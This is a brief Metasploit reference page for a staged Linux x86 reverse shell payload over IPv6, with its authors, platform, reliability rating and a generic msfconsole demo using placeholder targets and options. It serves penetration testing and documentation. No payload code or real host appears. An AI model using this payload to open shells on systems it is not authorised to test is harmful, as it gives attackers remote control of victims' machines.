## Linux Command Shell, Reverse TCP Stager (IPv6)

Spawn a command shell (staged). Connect back to attacker 
over IPv6


## Module Name
payload/linux/x86/shell/reverse_ipv6_tcp

## Authors
* skape
* kris katterjohn





## Platforms
* linux

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/linux/x86/shell/reverse_ipv6_tcp
msf payload(reverse_ipv6_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ipv6_tcp) > set TARGET <target-id>
msf payload(reverse_ipv6_tcp) > show options
   ... show and set options ...
msf payload(reverse_ipv6_tcp) > run
```
    
    